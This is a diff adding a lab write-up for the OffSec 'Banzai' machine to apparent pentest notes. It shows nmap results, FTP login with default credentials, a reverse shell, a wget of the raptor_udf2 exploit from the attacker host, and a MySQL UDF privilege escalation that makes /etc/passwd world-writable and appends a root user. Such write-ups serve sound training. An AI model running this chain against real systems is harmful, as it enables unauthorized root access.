@@ -3071,3 +3071,86 @@ PS C:\Users\ariah> net localgroup Administrators
 
 ssh login and check proof.txt
 ```
+
+## Banzai
+1. Nmap 
+```
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
+|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
+|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
+25/tcp   open  smtp       Postfix smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=banzai
+| Subject Alternative Name: DNS:banzai
+| Not valid before: 2020-06-04T14:30:35
+|_Not valid after:  2030-06-02T14:30:35
+|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
+5432/tcp open  postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
+| ssl-cert: Subject: commonName=banzai
+| Subject Alternative Name: DNS:banzai
+| Not valid before: 2020-06-04T14:30:35
+|_Not valid after:  2030-06-02T14:30:35
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http       Apache httpd 2.4.25
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.25 (Debian)
+8295/tcp open  http       Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Banzai
+Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found default password for ftp admin:admin. Add monkey pentest reverse shell. Obtained foothold at port 21. 
+```
+nc -lvnp 21
+listening on [any] 21 ...
+connect to [192.168.45.189] from (UNKNOWN) [192.168.224.56] 34066
+Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
+ 20:03:51 up 3 min,  0 users,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ SHELL=/bin/bash script -q /dev/null
+www-data@banzai:
+```
+
+3. Found 'Linux Privilege Escalation – Exploiting User-Defined Functions' vulnerability. 
+```
+ps aux | grep mysql
+ps aux | grep mysql
+root       696  0.0  8.8 1128228 181140 ?      Sl   20:00   0:00 /usr/sbin/mysqld --daemonizid-file=/var/run/mysqld/mysqld.pid
+root      1551  0.0  0.0  12780  1020 pts/0    S+   20:12   0:00 grep mysql
+```
+
+4. Exploitation, giving writable permission to passwd at the end. 
+```
+www-data@banzai:/var/www$ wget http://192.168.45.189:21/1518.c
+www-data@banzai:/var/www$ gcc -g -c 1518.c -o raptor_udf2.o -fPIC
+www-data@banzai:/var/www$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+www-data@banzai:/var/www$ mysql -u root -p
+mysql -u root -p
+Enter password: EscalateRaftHubris123 (from config.php)
+
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/var/www/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> show variables like '%plugin%';
+mysql> select do_system('chmod 777 /etc/passwd');
+```
+
+4. Rooted by adding new root user at /etc/passwd. 
+```
+www-data@banzai:/$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+www-data@banzai:/$ su root2
+su root2
+Password: w00t
+
+root@banzai:/# 
+```
